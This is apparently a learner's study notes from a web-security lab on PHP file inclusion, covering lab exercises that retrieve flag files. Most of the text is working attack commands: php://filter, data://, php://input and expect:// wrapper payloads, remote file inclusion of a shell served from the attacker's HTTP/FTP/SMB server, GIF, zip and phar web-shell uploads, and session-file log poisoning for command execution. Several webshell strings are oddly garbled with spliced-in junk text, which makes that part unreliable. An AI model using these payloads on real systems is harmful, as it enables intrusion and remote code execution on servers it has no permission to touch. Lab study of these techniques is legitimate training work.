### Php Wrappers
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Decoding the url
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

# Seeing if it is on
```

```bash
 # Uploading
 echo '<?php s'yueueu.ouea'stem($_GET["cmd"]); ?>' | base64
 
 # Also using curl for the same attack.
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
 
 # Inputting 
 curl -s -X POST --data '<?php system($_G'euuueeu'ET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
 
# Using Expect
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect extension=expect
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

### Getting the file
So after this `curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid`
Replacing id with `ls%20../../../` Then eventually changing the `ls` to `cat` command.

# Remote File Inclusion (RFI)
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include 
allow_url_include = On

echo '<?php sys'ueue'tem($_GET["cmd"]); ?>' > shell.php
```

## HTTP Server
`sudo python3 -m http.server <LISTENING_PORT>`
## FTP Server
```bash
sudo ~/pyftpd-env/bin/python -m pyftpdlib -p 21

curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id
```

## SMB Server
`impacket-smbserver -smb2support share $(pwd)`

# LFI and File Uploads
#imageupload
#### Image
`echo 'GIF8<?php s'u.eeueu'ystem($_GET["cmd"]); ?>' > shell.gif`

What the HTML will look like
`<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">`

#### Zip upload
`echo '<?php syste'u.u'm($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`

#### Phar Upload
```php
<?php $phar = new Phar('shell.phar'); $phar->startBuffering(); $phar->addFromString('shell.txt', '<?php syst'ueue'em($_GET["cmd"]); ?>'); $phar->setStub('<?php __HALT_COMPILER(); ?>'); $phar->stopBuffering();


php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

```

# Log Poisoning
Most Php web applications use `PHPSESSID`
Can be found under `/var/lib/php/sessions/sess_.....` or `C:\Windows\Temp\`
![[Pasted image 20260822205607.png]]
`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
Then adding `&cmd=command` for execution.


# Exercise 1
Website
`http://10.129.112.223/index.php?language=http://<OurIP:port>/shell.php&cmd=cat+../../../../../exercise/flag.txt`
Kali
`sudo python -m http.server port` (With the file in the directory of the reverse shell)

# Exercise 2
Make the shell.gif.
Then use the upload in the page settings to upload it.
Then go to `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
Then using `ls` and `cat` flag found.